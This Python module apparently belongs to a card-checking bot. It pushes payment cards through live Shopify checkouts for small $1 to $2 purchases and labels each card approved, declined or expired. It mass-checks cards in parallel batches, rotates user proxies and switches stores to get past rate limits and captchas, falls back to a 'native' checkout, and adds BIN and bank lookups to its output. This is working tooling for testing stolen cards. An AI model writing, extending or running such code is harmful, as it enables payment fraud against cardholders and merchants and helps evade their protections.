"""Shopify gate for the bot.

This module holds the ONE Shopify client in the codebase.  It talks to the
local Shopify Validator API (port 8081) which runs the full Shopify checkout
and returns the issuer's verdict.

Everything that checks a card on Shopify goes through here:
  * the gateway registry  -> shopify_api_check()   (string form, for the
    classifier)
  * the Telegram bot      -> call_shopify_api()   (rich dict)
  * the web panel         -> call_shopify_api()   (rich dict)

The old hosted API (shoify-api-production.up.railway.app) and the old native
shopify_native.py / shopify_form.py implementations were removed.
"""

import os
import time
import asyncio
import logging

logger = logging.getLogger("shopify_api")

SHOPIFY_API_URL = os.environ.get("SHOPIFY_API_URL", "http://127.0.0.1:8081").rstrip("/")
# There may be more than one validator service.  They work together: a
# mass is cut in two and the halves are asked at the same time, so twice
# the cards are asked for at once.  One of them on its own is not touched.
SHOPIFY_API_URLS = [u.rstrip("/") for u in
                    os.environ.get("SHOPIFY_API_URLS",
                                   SHOPIFY_API_URL + "," +
                                   "http://127.0.0.1:8083").split(",")
                    if u.strip()]
SHOPIFY_API_KEY = os.environ.get("SHOPIFY_API_KEY", "shopifyprod")
SHOPIFY_API_TIMEOUT = float(os.environ.get("SHOPIFY_API_TIMEOUT", "130"))

# Site errors mean "this store didn't work" -- try the next one.
SITE_ERROR_PREFIXES = (
    "NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN", "NO_SESSION_TOKEN",
    "NO_ATTEMPT_TOKEN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
    "THROTTLED", "TIMEOUT", "SITE_ERROR", "PROXY_ERROR", "NO_SELLER_PROPOSAL",
    "GRAPHQL_ERROR", "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX",
    # a session or a token that ran out says nothing about the card
    "SESSION_EXPIRED", "TOKEN_EXPIRED", "LINK_EXPIRED", "NEGOTIATE_FAILED",
    "ORDER_CREATION_FAILED", "SUBMIT_FAILED", "TOKENIZATION_FAILED",
    "CAPTCHA_REQUIRED", "API_AUTH_ERROR",
    # the processor gave up, which is a fault of the shop and not a word
    # about the card
    "PROCESSING_ERROR", "PROCESSOR_ERROR", "GATEWAY_ERROR",
    # the bank is busy or the transaction was a duplicate: the card was
    # not judged, and it is not to be blamed
    "ISSUER_NOT_AVAILABLE", "DUPLICATE_TRANSACTION",
)

# An expired card is a dead card, not a live one -- the validator hands back
# Shopify's BASE_EXPIRED code, which must not be read as approval.
EXPIRED_MARKERS = (
    "BASE_EXPIRED", "CARD_EXPIRED", "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
)

# What the codes the validator sends back mean, in words the user reads.
DECLINE_REASONS = (
    (("BASE_EXPIRED", "CARD_EXPIRED", "EXPIRED_CARD", "EXPIRY",
      "EXPIRATION", "INVALID_EXPIRY"), "The card is expired"),
    (("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "CVV_FAILURE",
      "INCORRECT_CVC", "CVC_CHECK_FAILED"), "The security code is wrong"),
    (("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE",
      "NOT_SUFFICIENT_FUNDS"), "There is not enough money on the card"),
    (("GENERIC_ERROR", "GENERIC_DECLINE", "GENERIC FAILURE"),
     "The payment failed and no exact reason was given"),
    (("INVALID_NUMBER", "INVALID_CARD", "INCORRECT_NUMBER", "BAD_NUMBER",
      "NO_SUCH_ISSUER"), "The card number is not valid"),
    (("INVALID_EXPIRY_DATE", "INVALID_EXPIRY"),
     "The card expiration date is invalid"),
    (("DO_NOT_HONOR",),
     "The bank refused the transaction without giving a specific reason"),
    (("INCORRECT_ZIP", "INCORRECT_POSTAL_CODE"),
     "The billing ZIP/postal code is incorrect"),
    (("LOST_CARD",), "The card was reported as lost"),
    (("STOLEN_CARD",), "The card was reported as stolen"),
    (("RESTRICTED_CARD",), "The card is restricted from making the transaction"),
    (("TRANSACTION_NOT_ALLOWED",),
     "The transaction is not permitted by the bank or the card issuer"),
    (("PICKUP_CARD", "PICK_UP_CARD"),
     "The issuer requests that the card be retained"),
    (("FRAUD_SUSPECTED",), "The issuer suspects fraud"),
    (("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION",
      "CALL_ISSUER", "REFER_TO_ISSUER"), "The issuer refused the card"),
    (("3DS_REQUIRED", "THREE_D_SECURE", "SCA_REQUIRED"),
     "The card needs a 3D Secure check"),
    (("CAPTCHA_REQUIRED", "CAPTCHA", "CHALLENGE_REQUIRED"),
     "The store asked for a captcha"),
    (("THROTTLED", "RATE_LIMIT"), "The store is rate limiting us"),
    (("NO_PRODUCT", "OUT_OF_STOCK", "INVENTORY"),
     "The store has no product to buy"),
    (("PROCESSING_ERROR", "PROCESSOR_ERROR", "GATEWAY_ERROR"),
     "The store could not finish the payment, so the card was not tested"),
)


# What the card is: the type, the bin, the bank and the country.  The
# other gates say this in their answer and a Shopify answer did not, so
# the log had nothing but a code.
_BIN_CACHE = {}
_BIN_URL = "https://bins.antipublic.cc/bins/{bin}"


async def _card_details(cc):
    """The details of a card, from its bin."""
    number = str(cc or "")
    bin_number = number[:6]
    if not bin_number.isdigit():
        return {}
    if bin_number in _BIN_CACHE:
        return _BIN_CACHE[bin_number]
    data = {}
    try:
        import aiohttp
        async with aiohttp.ClientSession() as sess:
            async with sess.get(_BIN_URL.format(bin=bin_number),
                                timeout=aiohttp.ClientTimeout(total=8)) as resp:
                data = await resp.json(content_type=None) or {}
    except Exception:
        data = {}
    if not isinstance(data, dict):
        data = {}
    out = {
        "brand": (data.get("brand") or "").upper(),
        "type": (data.get("type") or "").upper(),
        "bank": (data.get("bank") or "").upper(),
        "country": (data.get("country") or "").upper(),
        "bin": bin_number,
        "last4": number[-4:],
    }
    if not out["brand"] and not out["bank"]:
        out = {}
    _BIN_CACHE[bin_number] = out
    return out


def _detail_string(details):
    """The details of the card in one piece, the way the gates write them."""
    if not details:
        return ""
    parts = []
    card_type = " ".join(x for x in (details.get("brand"), details.get("type")) if x)
    if card_type:
        parts.append(card_type)
    if details.get("bin"):
        parts.append(details["bin"])
    if details.get("bank"):
        parts.append(details["bank"])
    if details.get("country"):
        parts.append(details["country"])
    if details.get("last4"):
        parts.append(details["last4"])
    return " | ".join(parts)

def _reason_for(blob):
    """A plain reason for the user, from the code the store sent."""
    upper = (blob or "").upper()
    for keys, reason in DECLINE_REASONS:
        if any(k in upper for k in keys):
            return reason
    if "DECLINED" in upper or "DECLINE" in upper:
        return "The issuer declined the card"
    return ""


async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=120,
                           price_min=None, price_max=None):
    """Check a card against the local Shopify Validator API.

    Returns a dict:
        status    approved | declined | error
        response  the issuer / validator message
        gateway, amount, site, elapsed, charged, extra
    """
    import aiohttp

    t0 = time.time()
    # The shop that answered last is not named here.  The validator gives
    # every shop a turn and puts the shops that answer first, so one shop
    # does not get every card of a mass run and put up a captcha.
    shops = [site] if site else []

    params = {
        "site": ",".join(shops),
        "cc": f"{cc}|{mm}|{yy}|{cvv}",
        "key": SHOPIFY_API_KEY,
    }
    if proxy:
        params["proxy"] = proxy
    # The price band: with a floor, the store sells an item that is worth
    # something instead of the cheapest sticker in the shop.
    if price_min is not None:
        params["min_price"] = str(price_min)
    if price_max is not None:
        params["max_price"] = str(price_max)

    # A store that is rate limiting us says so, and that is not a word
    # about the card.  The check is made again from another address,
    # so the card still reaches the bank.
    body = None
    last_error = ""
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(
                    f"{SHOPIFY_API_URL}/shopify",
                    params=params,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                ) as resp:
                    body = await resp.json(content_type=None)
        except Exception as e:
            last_error = f"{type(e).__name__}: {str(e)[:100]}"
            body = None

        throttled = False
        site_fault = False
        if isinstance(body, dict):
            code = str(body.get("Response", "") or "").strip()
            low = (code + " " + str(body.get("Message", "") or "")).lower()
            throttled = ("throttled" in low or "rate limit" in low
                         or "429" in low or "too many" in low
                         or "proxy_error" in low)
            # The shop's own trouble: the terms of its payment are
            # waiting, its delivery changed, it wants a name, it puts up
            # a picture.  None of that is a word about the card, so the
            # shop is stepped over and the card is asked of another one.
            site_fault = code.startswith("SITE_ERROR") or any(
                k in low for k in ("captcha required", "no session token",
                                   "pending terms", "delivery line detail",
                                   "price_over_max", "no products under",
                                   "first name required",
                                   "last name required",
                                   "payment flexibility"))
        if body is None and last_error:
            throttled = True
        if site_fault and params.get("site") and attempt < 2:
            # the shop that was named has its own trouble, so the shop
            # is let go of and the pool is used for this card
            params["site"] = ""
            sites = []
            throttled = True
            await asyncio.sleep(1)
            continue
        if not throttled or attempt >= 2:
            break

        # the next try leaves from another address
        if params.get("proxy"):
            proxies = [p for p in str(params["proxy"]).split(",") if p]
            if len(proxies) > 1:
                params["proxy"] = ",".join(proxies[1:] + proxies[:1])
        await asyncio.sleep(1 + attempt)

    if not isinstance(body, dict) or not body:
        logger.warning("shopify api failed: %s", last_error[:120])
        return {
            "status": "error",
            "response": f"API error: {last_error or 'no answer'}",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": site,
            "elapsed": round(time.time() - t0, 2),
            "charged": False,
            "extra": None,
        }

    resp_text = str(body.get("Response", "") or "").strip()
    message = str(body.get("Message", "") or resp_text).strip()

    # A shop that is busy with its own things has not judged the card,
    # so the card is asked in the native way, which is the way the shop
    # expects to be asked.
    if _the_shop_is_busy({"Response": resp_text, "Message": message}):
        _native = await _the_native_way(cc, mm, yy, cvv, proxy=proxy)
        if _native and not _the_shop_is_busy(_native):
            _native["elapsed"] = round(time.time() - t0, 2)
            _native["gateway"] = "Shopify Native"
            return _native
    elapsed = round(time.time() - t0, 2)

    is_site_error = any(resp_text.startswith(k) for k in SITE_ERROR_PREFIXES)

    # A shop that gave a real answer is kept, so the next card goes
    # straight to it.  The code can carry a prefix ("NO_PRODUCT: ..."),
    # so the shop error list decides it, not an exact match.
    if body.get("Site") and not is_site_error:
        _remember_site(body.get("Site"))

    # The code can sit in the response or in the message, so both are read.
    # The code can sit in the response or in the message, so both are read.
    is_expired = any(k in (resp_text + " " + message).upper() for k in EXPIRED_MARKERS)
    charged = str(body.get("Charged", "False")).lower() == "true"
    approved = str(body.get("Approved", "False")).lower() == "true"
    # A card that needs a 3D Secure check is live, but the challenge was
    # never confirmed, so it is not the same as a card that went through.
    three_ds = "3DS_REQUIRED" in (resp_text + " " + message).upper()

    # The words that are the bank's own trouble: the card was not
    # judged, and it is not to be blamed for them.
    _not_the_card = any(k in (resp_text + " " + message).upper() for k in (
        "ISSUER_NOT_AVAILABLE", "DUPLICATE_TRANSACTION",
        "PROCESSING_ERROR", "PROCESSOR_ERROR", "GATEWAY_ERROR"))

    if is_site_error:
        status = "error"
    elif _not_the_card:
        # the bank was busy or the transaction was a duplicate: the
        # card was not tested, so it is not refused either
        status = "error"
    elif is_expired:
        # The store says the card is expired.  That is a dead card, and it
        # stays a dead card even when the validator's own flag says approved.
        status = "declined"
    elif charged:
        status = "approved"
    elif approved:
        status = "approved_3ds" if three_ds else "approved"
    else:
        status = "declined"

    details = await _card_details(cc)

    explanation = _reason_for(resp_text + " " + message)
    if not explanation and status == "declined":
        explanation = "The issuer declined the card"

    return {
        "status": status,
        "response": message or resp_text or "Unknown",
        "gateway": body.get("Gateway", "Shopify Payments"),
        "amount": body.get("Price"),
        # did the card go all the way to the bank?  and what the shop
        # said when the tax of the order moved
        "bank_reached": bool(body.get("BankReached")),
        "tax_note": str(body.get("TaxNote") or "") or None,
        "site": body.get("Site") or site,
        "elapsed": elapsed,
        "charged": charged,
        "code": body.get("code") or body.get("Response") or "",
        "decline_code": body.get("decline_code") or "",
        "explanation": explanation,
        "product": body.get("Product", "") or "",
        "proxy": body.get("Proxy", "") or "",
        "retry": body.get("Retry", False),
        "api_time": body.get("Time", "") or "",
        "extra": {"product": body.get("Product", "")},
        "card_detail": _detail_string(details),
        "brand": details.get("brand", ""),
        "card_type": details.get("type", ""),
        "bank": details.get("bank", ""),
        "country": details.get("country", ""),
        "bin": details.get("bin", ""),
        "last4": details.get("last4", ""),
        "three_ds": three_ds,
    }


def _proxy_list_for(user_id, limit=20):
    """The user's proxies, as a list the validator can rotate through.

    The stores rate limit one address, so every card has to leave from a
    different one.  The validator picks one from the list per check.
    """
    if not user_id:
        return ""
    try:
        from gateways import get_user_proxy_list, _raw_to_formatted
        raw = get_user_proxy_list(str(user_id)) or []
    except Exception:
        return ""
    out = []
    for r in raw[:limit]:
        try:
            f = _raw_to_formatted(r)
        except Exception:
            f = ""
        if f:
            out.append(f)
    return ",".join(out)


# The price band for a real $1 to $2 charge.
SHOPIFY_MIN_PRICE = 1.0
SHOPIFY_MAX_PRICE = 2.0

# The shop that answered last.  Going straight back to it saves the
# hunt through the shops that sell nothing of that price, and that
# hunt was the slow part of the check.
GOOD_SITE_FILE = os.path.join(os.path.dirname(__file__), "..", "shopify_good_site.txt")


def _read_good_site():
    """The shop that answered last, if it is still written down."""
    try:
        with open(GOOD_SITE_FILE, encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        return ""


# The words of a shop that is busy with its own things: it waits for
# its terms, its tax moved, its goods are not published here, or it has
# nothing under the price.  None of them is a word about the card, for
# the card was never judged.
_SHOP_TROUBLE = (
    "SITE_ERROR", "PRICE_OVER_MAX", "NO_PRODUCT", "WAITING_PENDING_TERMS",
    "PENDING_TERMS", "TAX_NEW_TAX", "REQUIRED_ARTIFACTS",
    "MERCHANDISE_EXPECTED_PRICE", "MERCHANDISE_PRODUCT_NOT",
    "UNACCEPTABLE_PAYMENT_AMOUNT", "TOTAL_AMOUNT", "PAYMENTS_",
    "CART_FAILED", "NO_SESSION_TOKEN", "THROTTLED", "TIMEOUT",
    "NO_ATTEMPT_TOKEN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
    "SITE_REQUIRES_LOGIN", "SUBMIT_FAILED", "TOKENIZATION_FAILED",
)


def _the_shop_is_busy(answer) -> bool:
    """The shop is busy with its own things, so the card was never
    judged."""
    text = str((answer or {}).get("Response") or "")
    text += " " + str((answer or {}).get("Message") or "")
    up = text.upper()
    return any(word in up for word in _SHOP_TROUBLE)


async def _the_native_way(cc, mm, yy, cvv, proxy=None):
    """The card is asked of a real shop in the native way.

    The validator talks to the shops in their own way, and some of them
    want things the validator does not give them: their own terms, a
    tax that moved, goods that are not published in this place.  When
    that happens the card was never judged, so it is asked in the native
    way instead, which is the way a person at the shop's own page would
    do it.
    """
    try:
        import os as _os
        import sys as _sys
        _here = _os.path.dirname(_os.path.abspath(__file__))
        _bot = _os.path.dirname(_here)
        for _p in (_bot, _bot + "/bot"):
            if _p not in _sys.path:
                _sys.path.insert(0, _p)
        from gates.shopify_native_gate import check_card_native
    except Exception as e:
        logger.warning("the native way is not there: %s", str(e)[:70])
        return None
    try:
        out = await check_card_native(cc, mm, yy, cvv, site_url=None,
                                     proxy_str=proxy)
    except Exception as e:
        logger.warning("the native way could not be used: %s", str(e)[:70])
        return None
    if not out:
        return None
    _resp = str(out.get("Response") or "UNKNOWN")
    _code = _resp.split(":", 1)[0].strip().upper()
    _good = _code in ("ORDER_PLACED", "APPROVED", "CHARGED",
                      "INSUFFICIENT_FUNDS", "3DS_REQUIRED", "INVALID_CVC")
    return {
        "status": "approved" if _good else (
            "declined" if _code not in ("UNKNOWN", "SITE_ERROR",
                                        "NO_PRODUCT", "TIMEOUT") else "error"),
        "response": str(out.get("Message") or _resp)[:160],
        "gateway": out.get("Gateway") or "Shopify Native",
        "amount": out.get("Price"),
        "site": out.get("Site") or "",
        "elapsed": out.get("Time") or "",
        "charged": out.get("Charged"),
        "code": _code,
        "decline_code": "",
        "explanation": str(out.get("Message") or "")[:120],
        "product": out.get("Product") or "",
        "proxy": out.get("Proxy") or "",
        "retry": False,
        "api_time": out.get("Time") or "",
        "extra": {"product": out.get("Product") or ""},
        "card_detail": "",
        "brand": "", "card_type": "", "bank": "", "country": "",
        "bin": "", "last4": "", "three_ds": False,
        "Response": _resp,
        "Message": str(out.get("Message") or "")[:160],
        "Price": out.get("Price"),
        "Site": out.get("Site") or "",
        "Product": out.get("Product") or "",
    }


def _remember_site(site):
    """Keep the shop that answered, so the next card goes there."""
    if not site:
        return
    try:
        with open(GOOD_SITE_FILE, "w", encoding="utf-8") as f:
            f.write(str(site).strip())
    except Exception:
        pass


async def shopify_api_check_1_2(cc, mm, yy, cvv, site=None, proxy=None, user_id=None,
                                **kwargs):
    """Shopify, but the store sells an item worth $1 to $2.

    The validator picks the cheapest product inside the band, so the
    order is worth $1 to $2 instead of the $0.25 sticker a plain
    /shp buys.

    A narrow band can leave no shop with anything to sell, so the band
    is widened a little and the check is made again.  The answer is
    then a real one and never "no products".
    """
    last = None
    # The user's own proxies, all of them, so every card leaves from a
    # different address.  One address for the whole run is what makes the
    # stores put up a captcha.
    proxy_list = _proxy_list_for(user_id)
    for low, high in ((SHOPIFY_MIN_PRICE, SHOPIFY_MAX_PRICE), (0.50, 2.00)):
        result = await call_shopify_api(
            cc, mm, yy, cvv, site=site, proxy=(proxy_list or proxy),
            timeout=kwargs.get("timeout") or SHOPIFY_API_TIMEOUT,
            price_min=low, price_max=high,
        )
        response = str(result.get("response") or "")
        if "no product" in response.lower() or "no usable site" in response.lower():
            # no shop had anything of that price, a wider band will
            last = result
            continue
        return _format_result(result)
    return _format_result(last) if last else "Error - no shop had anything to sell"


async def shopify_api_check(cc, mm, yy, cvv, site=None, proxy=None, user_id=None,
                            **kwargs):
    """Check a card against Shopify via the local validator API.

    Returns a response string in the same shape the other gates use.
    """
    # The user's own proxies, all of them, so the validator can give
    # every card a different exit address.
    proxy_list = _proxy_list_for(user_id)
    result = await call_shopify_api(
        cc, mm, yy, cvv, site=site, proxy=(proxy_list or proxy),
        timeout=kwargs.get("timeout") or SHOPIFY_API_TIMEOUT,
        price_min=kwargs.get("price_min"),
        price_max=kwargs.get("price_max"),
    )

    return _format_result(result)


def _format_result(result):
    """The answer, in the words of the card's owner."""
    if not result:
        return "Error - no answer"
    response = str(result.get("response", "") or "Unknown").strip()
    message = response
    # The card details, so the log says what the card is and not only
    # what the store answered.
    detail = str(result.get("card_detail", "") or "")

    def _with_detail(text):
        return f"{text} | {detail}" if detail else text

    if result.get("status") == "error":
        return message

    if any(k in response.upper() for k in EXPIRED_MARKERS):
        return _with_detail(f"Declined - {message}")

    if result.get("status") == "approved_3ds":
        # The card is live, but the challenge was asked for and never
        # confirmed, so it is not the same as a card that went through.
        return _with_detail(f"Approved with 3ds - {message} (not confirmed)")

    if result.get("status") == "approved":
        return _with_detail(f"Approved - {message}")

    price = result.get("amount")
    if price and str(price) != "N/A":
        return _with_detail(f"{message} | ${price}")

    return _with_detail(message or response)


async def call_shopify_api_mass(cards, site=None, proxy=None,
                                price_min=None, price_max=None, timeout=None):
    """Many cards at once, the way the api takes them.

    The cards are asked for in one call, and the api asks the stores
    a few at a time.  The answers come back in the order the cards
    were given, so every card keeps its own answer.
    """
    import aiohttp
    import json as _json

    cards = [str(c or "").strip() for c in (cards or []) if str(c or "").strip()]
    if not cards:
        return []
    body = {
        "cards": cards,
        "site": site or "",
        "proxy": proxy or "",
        "key": SHOPIFY_API_KEY,
    }
    if price_min is not None:
        body["min_price"] = price_min
    if price_max is not None:
        body["max_price"] = price_max
    limit = float(timeout or (SHOPIFY_API_TIMEOUT * 4))
    urls = SHOPIFY_API_URLS or [SHOPIFY_API_URL]

    async def _ask(url, part):
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                        "%s/shopify/mass" % url,
                        json=dict(body, cards=part),
                        timeout=aiohttp.ClientTimeout(total=limit)) as resp:
                    return await resp.text()
        except Exception as e:
            logger.warning("the mass of cards could not be asked for: %s",
                           str(e)[:90])
            return ""

    if len(urls) > 1 and len(cards) > 1:
        # The cards are cut in two and the halves are asked at the same
        # time, so twice the cards are asked for at once.  The answers
        # come back in the order of the cards.
        half = (len(cards) + 1) // 2
        parts = [cards[:half], cards[half:]]
        texts = await asyncio.gather(*[_ask(u, p) for u, p in zip(urls, parts)],
                                     return_exceptions=True)
        merged = []
        for one in texts:
            if isinstance(one, BaseException) or not one:
                continue
            try:
                got = (_json.loads(one) or {}).get("results") or []
            except Exception as e:
                logger.warning("the answer of one half could not be "
                               "read: %s", str(e)[:80])
                continue
            merged.extend(got)
        if merged:
            text = _json.dumps({"results": merged})
        else:
            text = ""
    else:
        text = await _ask(urls[0], cards)

    if not text:
        return [{"Response": "UNKNOWN", "Message": "no answer came"}
                for _ in cards]
    try:
        import json as _json
        out = _json.loads(text)
    except Exception:
        logger.warning("the answer of the mass of cards could not be read")
        return [{"Response": "UNKNOWN", "Message": "the answer could not be read"}
                for _ in cards]
    answers = out.get("results") or []
    if len(answers) != len(cards):
        # every card keeps an answer, even if the api sent fewer
        answers = list(answers) + [{"Response": "UNKNOWN",
                                    "Message": "no answer came"}
                                   for _ in range(len(cards) - len(answers))]
    return answers
